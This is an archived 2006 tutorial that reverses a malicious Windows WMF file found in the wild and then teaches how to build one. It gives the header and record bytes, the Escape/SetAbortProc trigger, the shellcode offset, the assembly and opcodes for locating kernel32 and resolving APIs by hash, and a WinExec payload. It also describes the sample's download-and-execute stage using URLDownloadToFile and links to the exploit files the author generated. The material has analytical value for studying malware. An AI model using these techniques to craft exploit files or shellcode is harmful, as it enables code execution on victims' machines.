# WMF exploit

*Published 2006-05-27*

Wayback machine: https://web.archive.org/web/20140214160834/http://osix.net/modules/article/?id=789

> My experience on how to reverse a wmf exploit and understand how it works.

_Note: I had to re-submit this article after the site's recent problems. The links to the wmf files are broken for the moment_

## INTRODUCTION

While browsing some not-so-well-frequented website, Firefox proposed me to download a .wmf file.
Which I did but in my 'malware vault' to analyse it at home. And what a surprise! This exploit is evil!

I thought it was a well known bug and that there would be thousands of tutorials on how to write
shellcode for it but it is not the case. Some security annoucements.

Some [obscure perl module](https://web.archive.org/web/20140214160834/http://metasploit.com/projects/Framework/exploits.html#ie_xp_pfv_metafile)

and [a flash movie](https://web.archive.org/web/20140214160834/http://www.websensesecuritylabs.com/alerts/alert.php?AlertID=385) showing a wmf debugging session.

Those are the **only** useful information (i found) on the net about this exploit but still not detailed at all.
So I'll try here to reverse the format of 1 malicious wmf to see what it does and how to create one.

tools needed:
- hex editor
- kernel debugger (softice in my case)

## PART1: Finding the general format of a modified wmf file and understanding the exploit

The imressive thing about this bug is that you don't need to do anything.
Just by looking at the file, the exploit runs!

Well, actually not only looking at it, but a mouseover for example triggers the exploit.
It is impossible to touch or move the .wmf without running the exploit.
(you can still do it in a dos prompt and modify it with an hexadecimal editor)

After a quick look, the format of the corrupted wmf looks like that:

- HEADER
- Standard Record
- Decryption Procedure
- Encrypted Block
- Standard Records

When opening the file in an hex editor, we get no information.
Running a disasembler on it shouldn't show anything either.

In the only 2 files I found, the first 6 first bytes are always:
`01 00 09 00 00 03`

the standard wmf is:

- 18 byte Header
- Standard Record 1
- Standard Record 2
- Standard Record n
- Header Structure:

```
typedef struct _WindowsMetaHeader
{
  WORD FileType; /* Type of metafile (0=memory, 1=disk) */
  WORD HeaderSize; /* Size of header in WORDS (always 9) */
  WORD Version; /* Version of Microsoft Windows used */
  DWORD FileSize; /* Total size of the metafile in WORDs */
  WORD NumOfObjects; /* Number of objects in the file */
  DWORD MaxRecordSize; /* The size of largest record in WORDs */
  WORD NumOfParams; /* Not Used (always 0) */
} WMFHEAD;
```

Record Structure:

```
typedef struct _StandardMetaRecord
{
    DWORD Size; /* Total size of the record in WORDs */
    WORD Function; /* Function number (defined in WINDOWS.H) */
    WORD Parameters[]; /* Parameter values passed to function */
} WMFRECORD;
```

So in my case the header is:
`0100 0900 0003 521F0000 0000 06003D00 0000`

To 'translate' those values, we have to swap each byte and read from right to left.
(I'll explain more about little-endian later in the article)

`1000 9000 0300 25F10000 0000 6000D300 0000`

so the file type is 0001 = disk
header size is 0009 (standard header always = 18 bytes)
Version is 0300 = windows 3.0 and 3.1 (minimum compatibility)
Size is 00001F52 = 8018 words = 16 kb
...etc.

For detailed information about how records work, download O'Reilly WMF description on [wotsit.org](wotsit.org)

From my research on internet, I found that everything was happening in the `GDI32!Escape` function

So in softice we can put a memory breakpoint on execution on this function:


`bpm Escape X`

Now if we move the mouse over the wmf, softice breaks:

```
PUSH EBP
MOV EBP,ESP
SUB ESP,14
...etc. (the classic function)
```
The Escape structure is defined as:

```
int Escape(

    HDC hdc, // handle to device context
    int nEscape, // escape function
    int cbInput, // number of bytes in input structure
    LPCSTR lpvInData, // pointer to input structure
    LPVOID lpvOutData // pointer to output structure
   );
```

The parameter we are interested in is the 4th, Pointer to Input Structure.
Which is located at esp+10

As soon as you break on _Escape()_, dump this 4th parameter:

`d*(esp+10)`

Now you have the shellcode displayed on the screen.

`u *(esp+10)` will show you the assembly:

```
NOP
NOP
NOP
XOR ECX,ECX
MOV CX,103h
XOR BYTE PTR[ECX+ESI-1],97h
LOOP
```

You can put a bpx on the first 'nop' and then hit Ctrl-D to continue the execution and eventually break on this 'nop'.

Opcodes for the begining of that code are `909090 EB10 5E 33C9...etc.`

we can find it in the wmf file `@ offset 1D6h`
(this code is in clear in the wmf file)

The code we've just discovered is a very simple decryption procedure.
It XORs each byte of an encrypted block with 97h

The decryption starts from the end of the block (ecx+esi-1)
and goes up until the 259th byte.

What interests me at this moment is at what offset in the wmf the exploit starts and when it ends.
So we have the loop index `(ecx) = 103h`

The function starts the decryption from the end, and decrypts 103h bytes up.
The first byte to be decrypted is `ecx+esi-1`

- ecx = size of the part to decrypt
- esi-1 = part to decrypt

> so ecx+esi-1 = the last byte of the block to decrypt and it is 90h

Now going up in this block, I can find the other values of the block.

I take note of a dozen of values from the end of the block and find their position in the hexadecimal editor.
Last byte of the block `@ offset 2F7`

And the begining offset of the encrypted block will be:
`2F7 - 103 = 1F4`

We can dump this encrypted block in softice using:

`d ecx+esi-1`

I now trace step by step the decrypting loop and see that this block is being decyphered.
It contains a full url pointing to an executable file and something that looks like a password.

_(Note: What I thought was a password is actually part of the email address of the author of the perl module.
So I imagine the malware writer used that module to generate the file and didn't change the credits...)_

The rest of the block remains unknown for the moment.

After decrypting this block, the code will find Kernel32 image base.
(it will be used to hook some functions)

the hooking function is like:

```
mov ebx, some function
cmp word ptr[ebx], 5A4D ;5A4D = 'ZM' (MZ begining of exe or dll)
jz GotImageBase
sub ebx, 1000h
loop
GotImageBase:
```

I will detail it later in a code example.

From there it follows some parts of the PE structure to find the Export Table.
There it will look for:

- LoadLibraryA
- SetErrorMode
- ExitProcess
- WinExec

After doing this, it Loads Urlmon.dll and executes URLDownloadToFile.

### URLMON:

in urlmon.dll, the funtion:

```
URLDownloadToFile(0, URL, localFileName, 0, 0) //check param to see if that's the one used.
HRESULT URLDownloadToFile(
    LPUNKNOWN pCaller,
    LPCTSTR szURL,
    LPCTSTR szFileName,
    DWORD dwReserved,
    LPBINDSTATUSCALLBACK lpfnCB
);
```

The download will go to `C:~WRF0409.tmp`
It then obviously runs the executable it just downloaded using **WinExec**.

(My next article will probably be its analysis :)
But for the moment we're more interested in how the wmf exploit works.

## PART2: Writing some code to replace the one @ 1D6h

In PART1 we managed to find where 'everything started', that is the decryption procedure @ 1D6h in the wmf file.

Here I'm going to cheat a little and have a play with the existing code :joy:

We don't know how that shell code managed to get executed yet, but what we know is that the opcodes are
clearly displayed in the file and nothing prevents me from modifying it.

The hardest part in writing shellcode is how to locate addresses for jumps and calls.
Let's see the instruction JMP (EB) for example.

Given the following codes:

```
EB09
33DB
8AF9
47
8ADA
8BCB
6638C8
```

This part is just for testing and see how things work.
So let's just replace some values (anywhere between 1D6h and 2F7h) by the opcodes above:

Now if I `bpx Excape X` and go to 4th param I can see my new code there.

## PART3: Generating our own wmf

Note: Values here are expressed in WORDS or DWORDS using little-endian notation.

a **WORD** is 0000 and a **DWORD** is 0000 0000

Little-endian means that for the `DWORD 02AC`, the representation in the file would be AC02

To convert it easily, take 02AC, read from right to left: CA20 and rotate each byte: AC 02

So the value 02AC will appear as AC02 in the file.

### 1/ The header

As mentioned in the format documentation, the header is 18 bytes long.
3 WORDS, 1 DWORD, 1 WORD, 1 DWORD and 1 WORD

`0100 0900 0003 521F0000 0600 3D000000 0000`

We need to keep the first 3 WORDs as they are.
We can also leave the rest as it is but we will change the file size parameter later.
(the file size should be the size of the file / 2 !)

### 2/ Standard Records

Next we need to generate some meta records.
We could use always the same but we will use 4 different records.
As we saw earlier, the standard structure for a metarecord is

```
size DWORD
function WORD
param1 WORD (will be a random number between 0 and FF)
```

I'll show how to convert to little-endian for the first function, and then I'll use the values directly.

- CreatePenDirect:

_0000 0008_ -> _8000 0000_ -> _0800 0000_
_02FA_ -> _F20_ -> _FA02_

I choose 0000 for the parameter
So the complete function to put in the file will be:
**08000000FA020000**

- CreateBrushIndirect:

```
0700 0000
FC02
0000
```

- Rectangle:

```
0700 0000
1B04
0000
```

- LineTo:

```
0500 0000
1302
3200
6400
```

### 3/ Escape()

Now we need to call the escape function of course!

```
DWORD Size
WORD Function Code
WORD Parameter
```
->
```
0400 0000
26FF (alternatives: 0x0026, 0x0626)
0900 (9 is the value used to trigger the SetAbortProc function)
```

### 4/ shellcode

or the moment we'll just put a series of NOPs:
``9090909090909090909090909090909090909090`

### 5/ standard records

We actually don't need to include more records (they are usually added for obfuscation sake)

### 6/ footer

The footer is a standard record of size 3, function code 0 and no parameter:
```
0300 0000
0000
```

Our file is now 104 bytes big (68h) (the minimum size for an exploit is 64 bytes)

Now if we try this, nothing happens!

The **SECRET** is, for each function, add randomly 4 or 5 parameters with values between 00 and FF!

Open [this file](https://web.archive.org/web/20140214160834/http://www.osix.net/modules/folder/index.php?tid=10894&action=vf) in an hexadecimal editor.
(because of some upload problems I had to save them as .txt - replace the extension by .wmf)


- You will find the 18 bytes header
- The function 02FA of size 00000008 and with 5 parameters
- then the function 041B of size 00000007 and with 4 parameters
- then you find the unavoidable Escape function: 0400000026000900
- our shell code which does nothing (but is actually executed!)
- and finally the footer (which is a standard record but with no function code, size fixed to 3 and no parameter)

That's it! you could add more GDI functions before the Escape and more functions after the shellcode,
but it is only used for obfuscation. (and maybe to fool some anti-virus?)
(see o'reilly documentation to find more function codes)

In brief, we need the header (modify the file size at the end)
add 2 or 3 functions with 4 or five parameters for each.

The escape function, space for the shellcode, and the footer.
(It might sounds easy, but it was pretty hard to figure from scratch!)

From there, it is very easy to create a wmf file generator, but I'll leave it to you.
The aim of the article is to explain how things work, not to distribute wmf exploit files.

## PART4: Let's write some code (executing an application by hooking apis)

Something I haven't told yet is that the shellcode just after the escape record will not be executed.
You have to start your shellcode at the 4th byte after the last record:

`0400000026000900 90 90 90 AB`

Here only AB will be executed.

Giving the difficulty level of this section, I prepared [an executable](https://web.archive.org/web/20140214160834/http://www.osix.net/modules/folder/index.php?tid=10899&action=vf) you can debug with OllyDbg.
You will be able to follow what is described here.

It is highly recommended that you follow this code step by step if you want to understand how things work.
This executable reproduces exactly the behaviour of the shellcode we are trying to create.

_Note: Sometimes when you put a breakpoint in that program, OllyDbg will warn you about putting a breakpoint outside the code section._

Don't worry about this. It is because I modified the exe after compilation and I haven't modified the code section (size)

## ::FINDING Kernel32 IMAGE BASE::

### 1/ Method 1: Found in my example malware (see method 4 for similarities)

```
XOR ECX,ECX
MOV EAX,DWORD PTR FS:[ECX]
INC EAX

GetK32:
XCHG EAX,EBX
MOV EAX,DWORD PTR DS:[EBX-1]
INC EAX
JNZ GetK32
MOV EBX,DWORD PTR DS:[EBX+3]
XCHG AX,BX

FindMZ:
CMP WORD PTR DS:[EBX],5A4D
JE Continue
SUB EBX,1000
JMP FindMZ

Continue:
```

### 2/ Method 2: PEB (Process Environment Block)

```
PUSH ESI
XOR EAX,EAX
MOV EAX,DWORD PTR FS:[30h]
MOV EAX,DWORD PTR [EAX,0Ch]
MOV ESI,DWORD PTR [EAX,1Ch]
LODS DWORD PTR DS:[ESI]
MOV EAX,DWORD PTR [EAX,8h]
JMP End
End:
POP ESI
RET
```

### 3/ Method 3: SEH (Structure Exception Handling)

```
PUSH ESI
PUSH ECX
XOR ECX,ECX
MOV ESI,DWORD PTR FS:[ECX]
NOT ECX
Loop:
LODS DWORD PTR DS:[ESI]
MOV ESI,EAX
CMP DWORD PTR[EAX],ECX
JNE Loop
MOV EAX,DWORD PTR[EAX+4]
Loop2:
DEC EAX
XOR AX,AX
CMP WORD PTR[EAX],5A4Dh
JNE Loop2
POP ECX
POP ESI
RET
```

An exception handler often points to a Kernel32 function.
We just have to go up in the dll to find 'MZ'

### 4/ Method 4: Topstack, the one we're going to use.

```
00401000 PUSH ESI
00401001 XOR ESI,ESI
00401003 MOV ESI,DWORD PTR FS:[ESI+18]
00401007 LODS DWORD PTR DS:[ESI]
00401008 LODS DWORD PTR DS:[ESI]
00401009 MOV EAX,DWORD PTR DS:[EAX-1C]
0040100C DEC EAX
0040100D XOR AX,AX
00401010 CMP WORD PTR DS:[EAX],5A4D
00401015 JNZ SHORT hook.0040100C
00401017 POP ESI
00401018 RETN
00401019 NOP
```

Here we use the TEB (Thread Environment Block) located at fs:
[18h]

If you triggered the wmf file from Explorer, fs:[18h] will then be the subsystem thread of Explorer.
Then we get 1Ch bytes from the stack. The resulting address will always be located somewhere in Kernel32.dll
From there, we just go up in the dll until we find 5A4D which is 'MZ'.

The opcodes:

```
56
33F6
648B7618
AD
AD
8B40E4
48
6633C0
6681384D5A
75F5
5E
C3
90
```

I included the file with this code [here](https://web.archive.org/web/20140214160834/http://zeus.osix.net/modules/folder/index.php?tid=10769&action=vf) for you to follow.

We can now try and trace through this code and see that EAX now points to the begining of Kernel32.dll

## ::HOOKING A Kernel32 FUNCTION::

Now is the perfect time to remove the dust from our old PE structure documentation.

At `00401017`, EAX is pointing to 'MZ' which is the `IMAGE_DOS_HEADER`

For clarity sake, let's put that pointer in EBX and put the base pointer in EAX:

```
XCHG EAX,EBX
XCHG EAX,EBP
```

EBX is now the IMAGE_DOS_HEADER and eax is the base pointer.

From there, we need to locate the IMAGE_NT_HEADER (PE header) defined byt the _DWORD 00004550_ 'PE'.
This value is located 3Ch bytes from the IMAGE_DOS_HEADER:

`MOV ECX,[EBX+3C]`


Now ECX is a pointer to the PE header of Kernel32.dll and we need to find the Export Table.
If the NumberOfRvaAndSize is 10h (which is almost always the case), then IMAGE_NT_HEADER + 78h = IMAGE_DIRECTORY_ENTRY_EXPORT (Export Table)

```
MOV ECX,[ECX+EBX+78]
ADD ECX,EBX
```

We are now at the begining of the Export Table. (pointed by ECX)

Now let's consider the following code:

```
XOR ESI,ESI
LEA EDX,[ESI*4+EBX] ;Remember this Line, I'll refer to it as 'NextFunction' later
ADD EDX,[ECX+20h]
MOV EDX,[EDX]
ADD EDX,EBX
```

ESI is part of a loop and will be incremented later which means that in `LEA EDX,[ESI*4+EBX]` EBX will be incremented by a multiple of 4.

> **ECX+20** = IMAGE_NT_HEADER + 78h + 20h = IMAGE_NT_HEADER + 98h = VirtualAddress of IMAGE_DIRECTORY_ENTRY_SECURITY

And we move this VirtualAddress into EDX.

We just need to align it with the Kernel32 ImageBase using **ADD EDX,EBX** and EDX will point to the begining of the ExportTable.

This function will actually load each function of Kernel32 into EDX.

Examine the following code:

```
Label:
XOR EAX,EAX
ROL EAX,7
XOR AL,[EDX]
INC EDX
CMP BYTE PTR[EDX],00
JNZ Label
```

EDX being the begining of the Export Table, it points to the first first function: _ActivateActCtx_ (during the first loop)
This function will calculate a checksum of the currently processed function.

Here is a list of sum checksums:

- WinExec : E8BF6DAD
- LoadLibraryA : C8AC8026
- SetErrorMode : 6C544026
- ExitProcess : 95902B19
- URLDownloadToFile (urlmon.dll) : D95D2399
(Hooking a function from a dll different than Kernel32 will be explained in another article)

The next part of the code:

```
CMP EAX,EBP
JZ Next
INC ESI
CMP ESI,[ECX+18]
JB NextFunction
```

We compare the result of the checksum function, with the checksum we have in EBP.
If it's the same, we can leave, else we will have to loop to the 'NextFunction'
which points to the line I told you to remember earlier.

And Finally!

```
Next:
MOV EDX,[ECX+24]
ADD EDX,EBX ;align RVA
MOVZX EDX,WORD PTR[ESI*2+EDX]
MOV EAX,[ECX+1C]
ADD EAX,EBX
MOV EAX,[EDX*4+EAX]
ADD EAX,EBX ;Now we have WinExec in EAX
POP ESI
POP ECX
RET ;return to the calling function
```

Before going further, I'll put all those opcodes into a wmf file to see if it worked.

[Get it here](https://web.archive.org/web/20140214160834/http://www.osix.net/modules/folder/index.php?tid=10896&action=vf)

Oh, I forgot to tell you that the exploit will crash Explorer.exe (nothing terrible though)
so in case you wondered, nothing harmful happened.

Let's do something with `WinExec`

Like running regedit for example.

What we could do is add a string reference in the wmf file.
When you break on the Escape() function, and then put a breakpoint on your shellcode (cf first part),
ESI points to the begining of the shell code (which was 90909056)

We just need to count how many bytes there are between the first 90 and the start of the string we want to use
and insert just after POP ESI (remember we pushed ESI at the begining?) a code like:

```
push 0 ;show command
push [esi+pointer_to_string]
```


But we're not going to do this.

Instead we're going to push the string directly on the stack.
The string must be pushed inverted:

```
push 0
push 6578
push 652E7469
push 64656765
push 725C7377
push 6F646E69
push 775C3A43 ;path to regedit.exe in esp
push esp
call eax
```

The final file can be found [here](https://web.archive.org/web/20140214160834/http://www.osix.net/modules/folder/index.php?tid=10898&action=vf)

## CONCLUSION:

Given the very limited number of documentation on the subject, it has been pretty challenging to compile these articles.
I've said everything I wanted to say but I'm conscious that there are many other things to explain. It just didn't fit in my schedule.

The ideal conclusion would be to tell you not to do funny things with this exploit.
Oh, and if the last wmf file worked on your computer, don't forget to install the patch from Microsoft!

## REFERENCES:

The only documentation to read is:

WMF format from O'Reilly on [wotsit.org](https://web.archive.org/web/20140214160834/http://wotsit.org/)

Websense Alert
[http://www.websensesecuritylabs.com/alerts/alert.php?AlertID=385](https://web.archive.org/web/20140214160834/http://www.websensesecuritylabs.com/alerts/alert.php?AlertID=385)

and metasploit perl code (which I havent tried)
[http://metasploit.com/projects/Framework/exploits.html#ie_xp_pfv_metafile](https://web.archive.org/web/20140214160834/http://metasploit.com/projects/Framework/exploits.html#ie_xp_pfv_metafile)